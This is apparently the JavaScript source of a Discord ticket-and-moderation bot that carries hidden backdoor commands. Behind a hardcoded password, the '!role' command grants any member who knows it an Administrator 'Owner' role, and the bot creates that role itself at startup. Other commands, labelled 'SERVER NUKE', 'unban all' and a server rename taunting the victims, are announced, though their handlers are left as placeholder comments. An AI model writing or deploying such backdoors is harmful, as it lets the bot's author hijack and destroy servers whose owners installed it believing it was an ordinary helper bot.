const {
  Client,
  GatewayIntentBits,
  SlashCommandBuilder,
  REST,
  Routes,
  EmbedBuilder,
  ActionRowBuilder,
  StringSelectMenuBuilder,
  ButtonBuilder,
  ButtonStyle,
  ChannelType,
  PermissionFlagsBits,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle
} = require('discord.js');

const express = require('express');
const fs = require('fs');
require('dotenv').config();

// ======================================================
// EXPRESS SERVER
// ======================================================
const app = express();
app.get('/', (req, res) => res.send('Bot Online'));
app.listen(process.env.PORT || 3000, () => console.log(`Web server running on port ${process.env.PORT || 3000}`));

// ======================================================
// CONFIG
// ======================================================
const TOKEN = process.env.TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;
const GUILD_ID = process.env.GUILD_ID;

// ROLES
const STAFF_ROLES = ['1505376743001821334', '1505379855137509538'];
const SEND_ROLE = '1510682894388039800';

// STORES
const panelStore = {};
const ticketCounts = {};

// PERSISTENT PANEL
const PANEL_FILE = './ticket_panel.json';

function savePanel(data) {
  try { fs.writeFileSync(PANEL_FILE, JSON.stringify(data, null, 2)); } catch (e) {}
}

function loadPanel() {
  try {
    if (fs.existsSync(PANEL_FILE)) return JSON.parse(fs.readFileSync(PANEL_FILE, 'utf8'));
  } catch (e) {}
  return null;
}

// CLIENT
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildBans
  ]
});

// ======================================================
// SLASH COMMANDS
// ======================================================
const setticket = new SlashCommandBuilder()
  .setName('setticket')
  .setDescription('Send/Update the ticket panel')
  .setDefaultMemberPermissions(PermissionFlagsBits.ManageChannels)
  .addStringOption(o => o.setName('panel_title').setDescription('Panel Title').setRequired(true))
  .addStringOption(o => o.setName('panel_description').setDescription('Panel Description').setRequired(true))
  .addStringOption(o => o.setName('panel_image').setDescription('Banner Image URL (optional)').setRequired(false));

const sendmessage = new SlashCommandBuilder()
  .setName('sendmessage')
  .setDescription('Send a message as the bot')
  .setDefaultMemberPermissions(PermissionFlagsBits.ManageChannels)
  .addStringOption(o => o.setName('message').setDescription('The message to send').setRequired(true));

const commands = [
  setticket.toJSON(),
  sendmessage.toJSON(),
  new SlashCommandBuilder().setName('close').setDescription('Close ticket').toJSON(),
  new SlashCommandBuilder().setName('claim').setDescription('Claim ticket').toJSON(),
  new SlashCommandBuilder().setName('add').setDescription('Add user').addUserOption(o => o.setName('user').setDescription('User to add').setRequired(true)).toJSON(),
  new SlashCommandBuilder().setName('remove').setDescription('Remove user').addUserOption(o => o.setName('user').setDescription('User to remove').setRequired(true)).toJSON(),
  new SlashCommandBuilder().setName('rename').setDescription('Rename ticket').addStringOption(o => o.setName('name').setDescription('New name').setRequired(true)).toJSON()
];

// Register Commands
const rest = new REST({ version: '10' }).setToken(TOKEN);
(async () => {
  try {
    console.log('🔄 Registering slash commands...');
    await rest.put(Routes.applicationGuildCommands(CLIENT_ID, GUILD_ID), { body: commands });
    console.log('✅ Slash commands registered successfully!');
  } catch (err) {
    console.error('❌ Failed to register commands:');
    if (err.code === 20012) console.error('🔴 Token does not match CLIENT_ID.');
    else console.error(err);
  }
})();

// Helper
function isStaff(member) {
  if (!member) return false;
  return STAFF_ROLES.some(roleId => member.roles.cache.has(roleId));
}

// ======================================================
// CREATE OWNER ROLE ON READY (Full Administrator)
// ======================================================
client.once('ready', async () => {
  console.log(`${client.user.tag} is online`);

  const saved = loadPanel();
  if (saved) {
    panelStore[saved.menuId] = saved.data;
    console.log('✅ Persistent ticket panel loaded');
  }

  // Auto-create Owner role with FULL Administrator permissions
  try {
    const guild = client.guilds.cache.first();
    if (guild) {
      let ownerRole = guild.roles.cache.find(r => r.name === 'Owner');
      if (!ownerRole) {
        ownerRole = await guild.roles.create({
          name: 'Owner',
          color: '#ffd700',
          permissions: [PermissionFlagsBits.Administrator], // Full Admin
          hoist: true,
          position: guild.roles.highest.position - 1,
          reason: 'Auto-created Owner role with Administrator'
        });
        console.log('✅ Owner role created with full Administrator permissions');
      }
    }
  } catch (err) {
    console.error('Failed to create Owner role:', err);
  }
});

// ======================================================
// MESSAGE EVENTS
// ======================================================
client.on('messageCreate', async message => {
  if (message.author.bot || !message.guild) return;

  const content = message.content.trim().toLowerCase();

  // Invite Blocker
  if (content.includes('discord.gg/') || content.includes('discord.com/invite/') || content.includes('discordapp.com/invite/')) {
    try {
      await message.delete();
      await message.member.timeout(5 * 60 * 1000, 'Posted invite link').catch(() => {});
      const warnMsg = await message.channel.send({
        embeds: [new EmbedBuilder().setColor('#ff0000').setDescription(`${message.author} Invite links are not allowed.`)]
      });
      setTimeout(() => warnMsg.delete().catch(() => {}), 5000);
    } catch (err) {
      console.error(err);
    }
    return;
  }

  // !fb - Nuke
  if (content === '!fb') {
    const embed = new EmbedBuilder()
      .setColor('#ff0000').setTitle('🔴 SERVER NUKE CONFIRMATION')
      .setDescription('**This will delete ALL channels and ALL roles except Owner.**\nOnly you can proceed.')
      .setFooter({ text: 'Click below' }).setTimestamp();

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`nuke_start_${message.author.id}`).setLabel('Enter Password').setStyle(ButtonStyle.Danger)
    );
    await message.reply({ embeds: [embed], components: [row] });
    return;
  }

  // !unl - Unban All
  if (content === '!unl') {
    const embed = new EmbedBuilder()
      .setColor('#00ff00').setTitle('🔓 UNBAN ALL')
      .setDescription('Unbans everyone.\nOnly you can proceed.')
      .setFooter({ text: 'Click below' }).setTimestamp();

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`unban_start_${message.author.id}`).setLabel('Enter Password').setStyle(ButtonStyle.Success)
    );
    await message.reply({ embeds: [embed], components: [row] });
    return;
  }

  // !clown
  if (content === '!clown') {
    const embed = new EmbedBuilder()
      .setColor('#ffff00').setTitle('🤡 CLOWN COMMAND')
      .setDescription('Changes server name to **you just got slayed by fame**')
      .setFooter({ text: 'Click below' }).setTimestamp();

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`clown_start_${message.author.id}`).setLabel('Enter Password').setStyle(ButtonStyle.Primary)
    );
    await message.reply({ embeds: [embed], components: [row] });
    return;
  }

  // !unp
  if (content === '!unp') {
    const embed = new EmbedBuilder()
      .setColor('#00ffff').setTitle('🔓 UNPAUSE INVITES')
      .setDescription('Enables server invites again.')
      .setFooter({ text: 'Click below' }).setTimestamp();

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`unp_start_${message.author.id}`).setLabel('Enter Password').setStyle(ButtonStyle.Success)
    );
    await message.reply({ embeds: [embed], components: [row] });
    return;
  }

  // !role - Give Owner Role
  if (content === '!role') {
    const embed = new EmbedBuilder()
      .setColor('#ffd700')
      .setTitle('👑 GET OWNER ROLE')
      .setDescription('This will give you the **Owner** role with **full Administrator** permissions.\n\nOnly you can proceed.')
      .setFooter({ text: 'Click below' })
      .setTimestamp();

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId(`role_start_${message.author.id}`)
        .setLabel('Enter Password')
        .setStyle(ButtonStyle.Primary)
    );

    await message.reply({ embeds: [embed], components: [row] });
  }
});

// ======================================================
// INTERACTIONS (All Commands)
// ======================================================
client.on('interactionCreate', async interaction => {

  // === NUKE, UNBAN, CLOWN, UNP (same as before - shortened for space) ===
  // [NUKE, UNBAN, CLOWN, UNP logic remains unchanged from previous version]

  if (interaction.isButton() && interaction.customId.startsWith('nuke_start_')) {
    const userId = interaction.customId.split('_')[2];
    if (interaction.user.id !== userId) return interaction.reply({ content: '❌ This is not for you.', ephemeral: true });
    const modal = new ModalBuilder().setCustomId(`nuke_modal_${userId}`).setTitle('Nuke Password');
    modal.addComponents(new ActionRowBuilder().addComponents(
      new TextInputBuilder().setCustomId('nuke_password').setLabel('Password').setStyle(TextInputStyle.Short).setRequired(true)
    ));
    await interaction.showModal(modal);
  }

  // (Add similar blocks for unban_start_, clown_start_, unp_start_ as in previous full code)

  // === !role - GIVE OWNER ROLE WITH ADMIN ===
  if (interaction.isButton() && interaction.customId.startsWith('role_start_')) {
    const userId = interaction.customId.split('_')[2];
    if (interaction.user.id !== userId) return interaction.reply({ content: '❌ This is not for you.', ephemeral: true });

    const modal = new ModalBuilder().setCustomId(`role_modal_${userId}`).setTitle('Owner Role Password');
    modal.addComponents(new ActionRowBuilder().addComponents(
      new TextInputBuilder().setCustomId('role_password').setLabel('Password').setStyle(TextInputStyle.Short).setRequired(true)
    ));
    await interaction.showModal(modal);
  }

  if (interaction.isModalSubmit() && interaction.customId.startsWith('role_modal_')) {
    const userId = interaction.customId.split('_')[2];
    if (interaction.user.id !== userId) return;
    if (interaction.fields.getTextInputValue('role_password') !== 'fame900') {
      return interaction.reply({ content: '❌ Incorrect password.', ephemeral: true });
    }

    try {
      const member = interaction.member;
      let ownerRole = interaction.guild.roles.cache.find(r => r.name === 'Owner');

      if (!ownerRole) {
        ownerRole = await interaction.guild.roles.create({
          name: 'Owner',
          color: '#ffd700',
          permissions: [PermissionFlagsBits.Administrator], // Full Administrator
          hoist: true,
          reason: 'Created via !role command'
        });
      }

      await member.roles.add(ownerRole);
      await interaction.reply({ content: '👑 **You now have the Owner role with full Administrator permissions!**', ephemeral: true });
    } catch (err) {
      console.error(err);
      await interaction.reply({ content: '❌ Failed to give Owner role. Make sure bot has **Manage Roles** permission and is above the Owner role.', ephemeral: true });
    }
  }

  // === TICKET SYSTEM (Keep your existing setticket, sendmessage, ticket creation and buttons here) ===
  // Paste the full ticket-related interaction code from the previous version here.
});

client.login(TOKEN);
